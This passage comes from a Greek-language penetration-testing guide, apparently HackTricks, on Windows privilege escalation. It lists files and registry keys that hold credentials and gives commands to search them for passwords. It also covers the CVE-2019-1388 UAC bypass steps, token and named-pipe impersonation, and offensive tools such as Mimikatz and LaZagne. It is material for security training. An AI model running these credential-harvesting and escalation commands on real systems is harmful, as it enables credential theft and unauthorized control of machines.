$cred.GetNetworkCredential() | fl
```
### **Πιθανά ονόματα αρχείων που περιέχουν διαπιστευτήρια**

Γνωστά αρχεία που κάποτε περιείχαν **κωδικούς πρόσβασης** σε **καθαρό κείμενο** ή **Base64**
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Αναζητήστε όλα τα προτεινόμενα αρχεία:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### Credentials in the RecycleBin

Πρέπει επίσης να ελέγξετε τον Κάδο για να αναζητήσετε διαπιστευτήρια μέσα σε αυτόν

Για να **ανακτήσετε κωδικούς πρόσβασης** που έχουν αποθηκευτεί από διάφορα προγράμματα μπορείτε να χρησιμοποιήσετε: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Inside the registry

**Άλλες πιθανές κλειδαριές μητρώου με διαπιστευτήρια**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Εξαγωγή κλειδιών openssh από το μητρώο.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Ιστορικό Περιηγητών

Πρέπει να ελέγξετε για βάσεις δεδομένων όπου αποθηκεύονται οι κωδικοί πρόσβασης από **Chrome ή Firefox**.\
Επίσης, ελέγξτε την ιστορία, τα σελιδοδείκτες και τα αγαπημένα των περιηγητών ώστε ίσως να υπάρχουν αποθηκευμένοι κάποιοι **κωδικοί πρόσβασης** εκεί.

Εργαλεία για την εξαγωγή κωδικών πρόσβασης από περιηγητές:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Επικαλύψεις COM DLL**

**Το Component Object Model (COM)** είναι μια τεχνολογία που έχει ενσωματωθεί στο λειτουργικό σύστημα Windows και επιτρέπει την **διασύνδεση** μεταξύ λογισμικών συστατικών διαφορετικών γλωσσών. Κάθε συστατικό COM **ταυτοποιείται μέσω ενός ID κλάσης (CLSID)** και κάθε συστατικό εκθέτει λειτουργικότητα μέσω ενός ή περισσότερων διεπαφών, που ταυτοποιούνται μέσω ID διεπαφών (IIDs).

Οι κλάσεις και οι διεπαφές COM ορίζονται στο μητρώο κάτω από **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** και **HKEY\_**_**CLASSES\_**_**ROOT\Interface** αντίστοιχα. Αυτό το μητρώο δημιουργείται συγχωνεύοντας το **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Μέσα στους CLSIDs αυτού του μητρώου μπορείτε να βρείτε το παιδικό μητρώο **InProcServer32** που περιέχει μια **προεπιλεγμένη τιμή** που δείχνει σε μια **DLL** και μια τιμή που ονομάζεται **ThreadingModel** που μπορεί να είναι **Apartment** (Μονονηματικό), **Free** (Πολυνηματικό), **Both** (Μονο ή Πολυ) ή **Neutral** (Ουδέτερο νήμα).

![](<../../.gitbook/assets/image (729).png>)

Βασικά, αν μπορείτε να **επικαλύψετε οποιαδήποτε από τις DLLs** που πρόκειται να εκτελούνται, θα μπορούσατε να **κλιμακώσετε τα δικαιώματα** αν αυτή η DLL πρόκειται να εκτελεστεί από διαφορετικό χρήστη.

Για να μάθετε πώς οι επιτιθέμενοι χρησιμοποιούν την εκμετάλλευση COM ως μηχανισμό επιμονής, ελέγξτε:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Γενική αναζήτηση κωδικών πρόσβασης σε αρχεία και μητρώο**

**Αναζητήστε περιεχόμενα αρχείων**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Αναζητήστε ένα αρχείο με συγκεκριμένο όνομα αρχείου**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Αναζητήστε τη μητρώο για ονόματα κλειδιών και κωδικούς πρόσβασης**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Εργαλεία που αναζητούν κωδικούς πρόσβασης

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **είναι ένα msf** plugin που έχω δημιουργήσει αυτό το plugin για να **εκτελεί αυτόματα κάθε metasploit POST module που αναζητά κωδικούς πρόσβασης** μέσα στον θύμα.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) αναζητά αυτόματα όλα τα αρχεία που περιέχουν κωδικούς πρόσβασης που αναφέρονται σε αυτή τη σελίδα.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) είναι ένα άλλο εξαιρετικό εργαλείο για την εξαγωγή κωδικών πρόσβασης από ένα σύστημα.

Το εργαλείο [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) αναζητά **συνεδρίες**, **ονόματα χρηστών** και **κωδικούς πρόσβασης** διαφόρων εργαλείων που αποθηκεύουν αυτά τα δεδομένα σε καθαρό κείμενο (PuTTY, WinSCP, FileZilla, SuperPuTTY, και RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Φανταστείτε ότι **μια διαδικασία που εκτελείται ως SYSTEM ανοίγει μια νέα διαδικασία** (`OpenProcess()`) με **πλήρη πρόσβαση**. Η ίδια διαδικασία **δημιουργεί επίσης μια νέα διαδικασία** (`CreateProcess()`) **με χαμηλά δικαιώματα αλλά κληρονομεί όλα τα ανοιχτά handles της κύριας διαδικασίας**.\
Έτσι, αν έχετε **πλήρη πρόσβαση στη διαδικασία με χαμηλά δικαιώματα**, μπορείτε να αποκτήσετε το **ανοιχτό handle της διαδικασίας με δικαιώματα που δημιουργήθηκε** με `OpenProcess()` και **να εισάγετε ένα shellcode**.\
[Διαβάστε αυτό το παράδειγμα για περισσότερες πληροφορίες σχετικά με **το πώς να ανιχνεύσετε και να εκμεταλλευτείτε αυτήν την ευπάθεια**.](leaked-handle-exploitation.md)\
[Διαβάστε αυτήν την **άλλη ανάρτηση για μια πιο ολοκληρωμένη εξήγηση σχετικά με το πώς να δοκιμάσετε και να εκμεταλλευτείτε περισσότερα ανοιχτά handles διαδικασιών και νημάτων που κληρονομούνται με διαφορετικά επίπεδα δικαιωμάτων (όχι μόνο πλήρη πρόσβαση)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Τα τμήματα κοινής μνήμης, που αναφέρονται ως **pipes**, επιτρέπουν την επικοινωνία διαδικασιών και τη μεταφορά δεδομένων.

Τα Windows παρέχουν μια δυνατότητα που ονομάζεται **Named Pipes**, επιτρέποντας σε άσχετες διαδικασίες να μοιράζονται δεδομένα, ακόμη και μέσω διαφορετικών δικτύων. Αυτό μοιάζει με μια αρχιτεκτονική πελάτη/διακομιστή, με ρόλους που ορίζονται ως **named pipe server** και **named pipe client**.

Όταν δεδομένα αποστέλλονται μέσω ενός pipe από έναν **πελάτη**, ο **διακομιστής** που έχει ρυθμίσει το pipe έχει τη δυνατότητα να **αναλάβει την ταυτότητα** του **πελάτη**, εφόσον έχει τα απαραίτητα **SeImpersonate** δικαιώματα. Η αναγνώριση μιας **προνομιούχου διαδικασίας** που επικοινωνεί μέσω ενός pipe που μπορείτε να μιμηθείτε παρέχει μια ευκαιρία να **κερδίσετε υψηλότερα δικαιώματα** υιοθετώντας την ταυτότητα αυτής της διαδικασίας μόλις αλληλεπιδράσει με το pipe που δημιουργήσατε. Για οδηγίες σχετικά με την εκτέλεση μιας τέτοιας επίθεσης, μπορείτε να βρείτε χρήσιμους οδηγούς [**εδώ**](named-pipe-client-impersonation.md) και [**εδώ**](./#from-high-integrity-to-system).

Επίσης, το παρακάτω εργαλείο επιτρέπει να **παρεμβάλετε μια επικοινωνία named pipe με ένα εργαλείο όπως το burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **και αυτό το εργαλείο επιτρέπει να καταγράφετε και να βλέπετε όλα τα pipes για να βρείτε privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Misc

### **Monitoring Command Lines for passwords**

Όταν αποκτάτε ένα shell ως χρήστης, μπορεί να υπάρχουν προγραμματισμένα καθήκοντα ή άλλες διαδικασίες που εκτελούνται και **περνούν διαπιστευτήρια στη γραμμή εντολών**. Το παρακάτω σενάριο καταγράφει τις γραμμές εντολών διαδικασιών κάθε δύο δευτερόλεπτα και συγκρίνει την τρέχουσα κατάσταση με την προηγούμενη κατάσταση, εκτυπώνοντας τυχόν διαφορές.
```powershell
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Κλοπή κωδικών πρόσβασης από διεργασίες

## Από Χαμηλό Προνομιακό Χρήστη σε NT\AUTHORITY SYSTEM (CVE-2019-1388) / Παράκαμψη UAC

Εάν έχετε πρόσβαση στη γραφική διεπαφή (μέσω κονσόλας ή RDP) και το UAC είναι ενεργοποιημένο, σε ορισμένες εκδόσεις των Microsoft Windows είναι δυνατή η εκτέλεση ενός τερματικού ή οποιασδήποτε άλλης διεργασίας όπως "NT\AUTHORITY SYSTEM" από έναν χρήστη χωρίς προνόμια.

Αυτό καθιστά δυνατή την αναβάθμιση προνομίων και την παράκαμψη του UAC ταυτόχρονα με την ίδια ευπάθεια. Επιπλέον, δεν υπάρχει ανάγκη εγκατάστασης οτιδήποτε και το δυαδικό αρχείο που χρησιμοποιείται κατά τη διαδικασία είναι υπογεγραμμένο και εκδοθέν από τη Microsoft.

Ορισμένα από τα επηρεαζόμενα συστήματα είναι τα εξής:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Για να εκμεταλλευτείτε αυτήν την ευπάθεια, είναι απαραίτητο να εκτελέσετε τα εξής βήματα:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
Έχετε όλα τα απαραίτητα αρχεία και πληροφορίες στο παρακάτω αποθετήριο GitHub:

https://github.com/jas502n/CVE-2019-1388

## Από το Medium επίπεδο ακεραιότητας του Διαχειριστή στο Υψηλό επίπεδο ακεραιότητας / Παράκαμψη UAC

Διαβάστε αυτό για να **μάθετε για τα επίπεδα ακεραιότητας**:

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

Στη συνέχεια, **διαβάστε αυτό για να μάθετε για το UAC και τις παρακάμψεις UAC:**

{% content-ref url="../authentication-credentials-uac-and-efs/uac-user-account-control.md" %}
[uac-user-account-control.md](../authentication-credentials-uac-and-efs/uac-user-account-control.md)
{% endcontent-ref %}

## **Από το Υψηλό επίπεδο ακεραιότητας στο Σύστημα**

### **Νέα υπηρεσία**

Εάν ήδη εκτελείστε σε μια διαδικασία Υψηλής Ακεραιότητας, η **μετάβαση στο SYSTEM** μπορεί να είναι εύκολη απλά **δημιουργώντας και εκτελώντας μια νέα υπηρεσία**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
### AlwaysInstallElevated

Από μια διαδικασία Υψηλής Ακεραιότητας, μπορείτε να προσπαθήσετε να **ενεργοποιήσετε τις καταχωρίσεις μητρώου AlwaysInstallElevated** και να **εγκαταστήσετε** ένα reverse shell χρησιμοποιώντας ένα _**.msi**_ wrapper.\
[Περισσότερες πληροφορίες σχετικά με τα κλειδιά μητρώου που εμπλέκονται και πώς να εγκαταστήσετε ένα _.msi_ πακέτο εδώ.](./#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Μπορείτε** [**να βρείτε τον κώδικα εδώ**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Εάν έχετε αυτά τα δικαιώματα token (πιθανώς θα το βρείτε σε μια ήδη Υψηλής Ακεραιότητας διαδικασία), θα μπορείτε να **ανοίξετε σχεδόν οποιαδήποτε διαδικασία** (όχι προστατευμένες διαδικασίες) με το δικαίωμα SeDebug, **να αντιγράψετε το token** της διαδικασίας και να δημιουργήσετε μια **τυχαία διαδικασία με αυτό το token**.\
Η χρήση αυτής της τεχνικής συνήθως **επιλέγει οποιαδήποτε διαδικασία που εκτελείται ως SYSTEM με όλα τα δικαιώματα token** (_ναι, μπορείτε να βρείτε διαδικασίες SYSTEM χωρίς όλα τα δικαιώματα token_).\
**Μπορείτε να βρείτε ένα** [**παράδειγμα κώδικα που εκτελεί την προτεινόμενη τεχνική εδώ**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Αυτή η τεχνική χρησιμοποιείται από το meterpreter για να κλιμακώσει στο `getsystem`. Η τεχνική συνίσταται στο **να δημιουργήσετε έναν σωλήνα και στη συνέχεια να δημιουργήσετε/καταχραστείτε μια υπηρεσία για να γράψετε σε αυτόν τον σωλήνα**. Στη συνέχεια, ο **διακομιστής** που δημιούργησε τον σωλήνα χρησιμοποιώντας το δικαίωμα **`SeImpersonate`** θα μπορεί να **υποδυθεί το token** του πελάτη του σωλήνα (της υπηρεσίας) αποκτώντας δικαιώματα SYSTEM.\
Εάν θέλετε να [**μάθετε περισσότερα σχετικά με τους ονομαστικούς σωλήνες, θα πρέπει να διαβάσετε αυτό**](./#named-pipe-client-impersonation).\
Εάν θέλετε να διαβάσετε ένα παράδειγμα [**πώς να πάτε από υψηλή ακεραιότητα σε System χρησιμοποιώντας ονομαστικούς σωλήνες, θα πρέπει να διαβάσετε αυτό**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Εάν καταφέρετε να **καταχραστείτε μια dll** που **φορτώνεται** από μια **διαδικασία** που εκτελείται ως **SYSTEM**, θα μπορείτε να εκτελέσετε τυχαίο κώδικα με αυτές τις άδειες. Επομένως, η Dll Hijacking είναι επίσης χρήσιμη για αυτό το είδος κλιμάκωσης δικαιωμάτων και, επιπλέον, είναι **πολύ πιο εύκολη να επιτευχθεί από μια διαδικασία υψηλής ακεραιότητας** καθώς θα έχει **δικαιώματα εγγραφής** στους φακέλους που χρησιμοποιούνται για τη φόρτωση dlls.\
**Μπορείτε** [**να μάθετε περισσότερα σχετικά με την Dll hijacking εδώ**](dll-hijacking/)**.**

### **From Administrator or Network Service to System**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Διαβάστε:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Καλύτερο εργαλείο για αναζήτηση παραγόντων κλιμάκωσης τοπικών δικαιωμάτων Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Ελέγξτε για κακή διαμόρφωση και ευαίσθητα αρχεία (**[**ελέγξτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Ανιχνεύθηκε.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Ελέγξτε για κάποιες πιθανές κακές διαμορφώσεις και συγκεντρώστε πληροφορίες (**[**ελέγξτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Ελέγξτε για κακή διαμόρφωση**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Εξάγει πληροφορίες αποθηκευμένων συνεδριών PuTTY, WinSCP, SuperPuTTY, FileZilla και RDP. Χρησιμοποιήστε -Thorough τοπικά.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Εξάγει διαπιστευτήρια από τον Διαχειριστή Διαπιστευτηρίων. Ανιχνεύθηκε.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Ψεκάστε συγκεντρωμένους κωδικούς πρόσβασης σε τομέα**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Το Inveigh είναι ένα εργαλείο spoofing και man-in-the-middle PowerShell ADIDNS/LLMNR/mDNS/NBNS.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Βασική αναγνώριση Windows privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Αναζητήστε γνωστές ευπάθειες privesc (ΑΠΟΡΡΙΦΘΕΙΣΑ για Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Τοπικοί έλεγχοι **(Απαιτούνται δικαιώματα διαχειριστή)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Αναζητήστε γνωστές ευπάθειες privesc (πρέπει να γίνει μεταγλώττιση χρησιμοποιώντας το VisualStudio) ([**προμεταγλωττισμένο**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Αναγνωρίζει τον υπολογιστή αναζητώντας κακές διαμορφώσεις (περισσότερο εργαλείο συγκέντρωσης πληροφοριών παρά privesc) (πρέπει να γίνει μεταγλώττιση) **(**[**προμεταγλωττισμένο**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Εξάγει διαπιστευτήρια από πολλά λογισμικά (προμεταγλωττισμένο exe στο github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port του PowerUp σε C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- Ελέγξτε για κακή διαμόρφωση (εκτελέσιμο προμεταγλωττισμένο στο github). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Ελέγξτε για πιθανές κακές διαμορφώσεις (exe από python). Δεν συνιστάται. Δεν λειτουργεί καλά σε Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Εργαλείο που δημιουργήθηκε με βάση αυτή την ανάρτηση (δεν χρειάζεται accesschk για να λειτουργήσει σωστά αλλά μπορεί να το χρησιμοποιήσει).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Διαβάζει την έξοδο του **systeminfo** και προτείνει λειτουργικά exploits (τοπικό python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Πρέπει να μεταγλωττίσετε το έργο χρησιμοποιώντας την κατάλληλη έκδοση του .NET ([δείτε αυτό](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Για να δείτε την εγκατεστημένη έκδοση του .NET στον υπολογιστή του θύματος, μπορείτε να κάνετε:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Βιβλιογραφία

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
